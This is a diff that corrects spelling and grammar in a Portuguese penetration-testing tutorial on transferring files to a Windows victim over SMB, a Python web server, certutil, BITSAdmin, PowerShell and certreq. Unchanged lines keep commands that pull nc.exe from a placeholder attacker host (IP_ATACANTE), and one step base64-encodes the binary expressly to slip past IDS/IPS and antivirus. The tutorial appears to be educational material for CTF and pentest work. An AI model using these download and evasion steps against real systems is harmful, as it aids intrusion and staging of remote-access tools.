@@ -14,7 +14,7 @@ O Server Message Block (SMB) é um protocolo de rede utilizado em sistemas opera
 
 ### Instalação e configuração (Máquina Linux - Atacante)
 
-Para realizar o compartilhamento via SMB vamos utilizar o utilitário Impacket que consiste em um conjunto de classes e ferramentas em Python para implementar, maniputar e trabalhar com diversos protocolos de redes (IP, TCP, UDP, ICMP, SMB, HTTP, LDAP). 
+Para realizar o compartilhamento via SMB vamos utilizar o utilitário Impacket que consiste em um conjunto de classes e ferramentas em Python para implementar, manipular e trabalhar com diversos protocolos de redes (IP, TCP, UDP, ICMP, SMB, HTTP, LDAP). 
 
 Nas versões mais recentes do Kali, o Impacket já vem instalado por padrão, mas caso esteja utilizando outra distribuição Linux, siga as etapas abaixo para instalar o Impacket.
 
@@ -46,7 +46,7 @@ sudo ln -s /usr/share/impacket/script /usr/bin/impacket-smbserver
 
 Após a instalação e configuração, podemos seguir com o processo de disponibilização do arquivo para download. Para isso, siga os passos abaixo:
 
-1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela, nesse exemplo estarei usando o nc.exe:
+1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela, nesse exemplo usarei o nc.exe:
    
 ```bash
 mkdir -p /tmp/shared/ ; cd /tmp/shared/
@@ -203,9 +203,9 @@ Um servidor Python pode ser usado para hospedar sites, aplicativos web, serviço
 
 ### Instalação e configuração (Máquina Linux - Atacante)
 
-Geralmente em algumas versões do Linux o Python3 já vem instalado, caso ainda não possua esse útilitario siga as etapas abaixo:
+Geralmente em algumas versões do Linux o Python3 já vem instalado, caso ainda não possua esse utilitário siga as etapas abaixo:
 
-1. Atualize o sistema e instalte o Pyhton3 e Pip3
+1. Atualize o sistema e instale o Pyhton3 e Pip3
 
 ```bash
 sudo apt update && sudo apt install python3 python3-pip
@@ -215,7 +215,7 @@ sudo apt update && sudo apt install python3 python3-pip
 
 Após a instalação e configuração podemos seguir com o processo de disponibilização do arquivo para Download. Para isso siga os passos abaixo:
 
-1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela, nesse exemplo estarei usando o nc.exe:
+1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela, nesse exemplo usarei o nc.exe:
    
 ```bash
 mkdir -p /tmp/shared/ ; cd /tmp/shared/
@@ -243,11 +243,11 @@ Uma vez com todas essas etapas configuradas, podemos seguir para o ambiente Wind
 
 ### Aviso
 
-Diferente do Linux que possui vários útilitarios de linhas de comando como wget e curl para realizar o download de arquivos da internet o Windows não possui exatamente esses mesmo recursos, desse modo para realizar download de arquivos através de um servidor web podemos utilizar o Certutil, BITSAdmin e Powershell. Abaixo seá demonstrado como realizar o processo de download utilizando essas ferramentas.
+Diferente do Linux que possui vários utilitários de linhas de comando como wget e curl para realizar o download de arquivos da internet o Windows não possui exatamente esses mesmos recursos, desse modo para realizar download de arquivos através de um servidor web podemos utilizar o Certutil, BITSAdmin e Powershell. Abaixo será demonstrado como realizar o processo de download utilizando essas ferramentas.
 
 ### Processo de Download com Certutil (Máquina Windows - Vítima) 
 
-Certutil é uma ferramenta de linha de comando presente nos sistemas operacionais Windows que tem diversas funcionalidades relacionadas à gestão de certificados digitais e arquivos criptográficos. Essa utilitário permite realizar operações como instalar, visualizar, exportar e gerar certificados, além de executar verificações de assinaturas digitais, calcular hashes e muito mais. Em resumo, o Certutil é uma ferramenta versátil que desempenha um papel essencial na administração de certificados e na validação de arquivos em ambientes Windows, embora não seja bem documentado pela Microsoft esse binário pode ser utilizado para realizar download de arquivos.
+Certutil é uma ferramenta de linha de comando presente nos sistemas operacionais Windows que tem diversas funcionalidades relacionadas à gestão de certificados digitais e arquivos criptográficos. Esse utilitário permite realizar operações como instalar, visualizar, exportar e gerar certificados, além de executar verificações de assinaturas digitais, calcular hashes e muito mais. Em resumo, o Certutil é uma ferramenta versátil que desempenha um papel essencial na administração de certificados e na validação de arquivos em ambientes Windows, embora não seja bem documentado pela Microsoft esse binário pode ser utilizado para realizar download de arquivos.
 
 Para realizar o download com certutil siga as etapas abaixo:
 
@@ -265,17 +265,17 @@ certutil.exe -hashfile nc.exe md5
 
 ### Processo de Download com Certutil com dados em base64 (Máquina Windows - Vítima) 
 
-Uma característica interessante do certutil.exe é a capacidade de processar uma informação codificada em Base64 para o arquivo original Ou seja, podemos tomar a representação base64 do executável nc.exe, colocar num arquivo texto, fazer o download via certutil.exe e transformar o texto novamente no executável
+Uma característica interessante do certutil.exe é a capacidade de processar uma informação codificada em Base64 para o arquivo original, ou seja, podemos tomar a representação base64 do executável nc.exe, colocar num arquivo texto, fazer o download via certutil.exe e transformar o texto novamente no executável
 
 Essa é uma forma de o atacante evitar levantar suspeitas e tentar contornar algumas proteções (bypass) de IDS/IPS e Antivírus
 
-Na maquina do atacante, transforme o executável nc.exe em um arquivo texto, que é a representação em base64
+Na máquina do atacante, transforme o executável nc.exe em um arquivo texto, que é a representação em base64
 
 ```bash
 cat nc.exe | base64 > nc.txt
 ```
 
-Na maquina vítima, realize o processo de decode e download
+Na máquina vítima, realize o processo de decode e download
 
 ```bash
 certutil -urlcache -split -f "http://IP_ATACANTE/nc.txt" nc.txt
@@ -324,7 +324,7 @@ Outro benefício notável do BITSAdmin é a sua utilidade na transferência de a
 
 Uma funcionalidade bastante apreciada é a capacidade de retomar downloads interrompidos. Caso uma transferência seja interrompida, o BITSAdmin permite que o processo seja reiniciado exatamente de onde parou, economizando tempo e recursos.
 
-Existe algumas formas de realizar o download com BITSAdmin, abaixo serão demonstrado 2 formas de realizar esse processo:
+Existe algumas formas de realizar o download com BITSAdmin, abaixo serão demonstradas 2 formas de realizar esse processo:
 
 **Primeira Forma:**
 
@@ -344,7 +344,7 @@ bitsadmin /transfer <nome_do _job> /priority foreground http://IP_ATACANTE/nc.ex
 
 ### Processo de Download com Powershell (Máquina Windows - Vítima) 
 
-Com certeza essa deve ser a forma mais conhecida de realizar download de arquivos em ambientes windows, provavelmente você já deve ter usado e abusado dela muito durante o trabalho ou durante CTF's. O PowerShell é uma interface de linha de comando e uma linguagem de script desenvolvida pela Microsoft para sistemas Windows. Ela permite que os usuários interajam com o sistema operacional e realizem uma variedade de tarefas, desde tarefas simples até automações complexas. O PowerShell é especialmente poderoso para administração de sistemas, automação de tarefas e configuração de ambientes Windows. Ele oferece acesso a uma ampla gama de comandos, chamados de cmdlets, que permitem executar diversas operações, gerenciando arquivos, processos, usuários, redes e muito mais. Sua flexibilidade e capacidade de integração com outras tecnologias o tornam uma ferramenta valiosa para administradores de sistemas e profissionais de segurança. Nas versões mais atuais do Windows ao digitar **`wget`** ou **`curl`** provavelmente deve funcionar, pois esse é um alias para o **`Invoke-WebRequest`**, você pode validar isso facilmente digitando o comando **`Get-Help Invoke-WebRequest`**
+Com certeza essa deve ser a forma mais conhecida de realizar download de arquivos em ambientes Windows, provavelmente você já deve ter usado e abusado dela muito durante o trabalho ou durante CTF's. O PowerShell é uma interface de linha de comando e uma linguagem de script desenvolvida pela Microsoft para sistemas Windows. Ela permite que os usuários interajam com o sistema operacional e realizem uma variedade de tarefas, desde tarefas simples até automações complexas. O PowerShell é especialmente poderoso para administração de sistemas, automação de tarefas e configuração de ambientes Windows. Ele oferece acesso a uma ampla gama de comandos, chamados de cmdlets, que permitem executar diversas operações, gerenciando arquivos, processos, usuários, redes e muito mais. Sua flexibilidade e capacidade de integração com outras tecnologias o tornam uma ferramenta valiosa para administradores de sistemas e profissionais de segurança. Nas versões mais atuais do Windows ao digitar **`wget`** ou **`curl`** provavelmente deve funcionar, pois esse é um alias para o **`Invoke-WebRequest`**, você pode validar isso facilmente digitando o comando **`Get-Help Invoke-WebRequest`**
 
 Para usar o **`Invoke-WebRequest`** siga as etapas abaixo:
 
@@ -366,7 +366,7 @@ ou
 
 PHP Server é um software que permite a execução de aplicativos e scripts PHP em um servidor local. Ele funciona como um ambiente de desenvolvimento que simula um servidor web real em um computador local ou em uma rede interna. Isso permite que desenvolvedores testem e depurem suas aplicações PHP antes de implantá-las em um servidor de produção. O PHP Server é uma ferramenta útil para criar e testar websites ou aplicações que dependem da linguagem de programação PHP.
 
-Certreq é uma ferramenta de linha de comando utilizada em sistemas Windows para solicitar e emitir certificados digitais a partir de uma Autoridade de Certificação (AC) ou uma infraestrutura de chave pública (PKI). Essa ferramenta é comumente empregada para realizar a solicitação de certificados de segurança para diversos fins, como autenticação, criptografia de dados, assinaturas digitais e outros processos que envolvam o uso de chaves públicas e privadas. O "certreq" permite aos administradores e usuários gerenciar a emissão e instalação de certificados, proporcionando uma forma segura de garantir a autenticidade e a confidencialidade das informações em um ambiente Windows. Apessar de não ser bem documentado é possivel utilizar o certreq para realizar download de arquivos.
+Certreq é uma ferramenta de linha de comando utilizada em sistemas Windows para solicitar e emitir certificados digitais a partir de uma Autoridade de Certificação (AC) ou uma infraestrutura de chave pública (PKI). Essa ferramenta é comumente empregada para realizar a solicitação de certificados de segurança para diversos fins, como autenticação, criptografia de dados, assinaturas digitais e outros processos que envolvam o uso de chaves públicas e privadas. O "certreq" permite aos administradores e usuários gerenciem a emissão e instalação de certificados, proporcionando uma forma segura de garantir a autenticidade e a confidencialidade das informações em um ambiente Windows. Apesar de não ser bem documentado é possível utilizar o certreq para realizar download de arquivos.
 
 ### Instalação e configuração (Máquina Linux - Atacante)
 
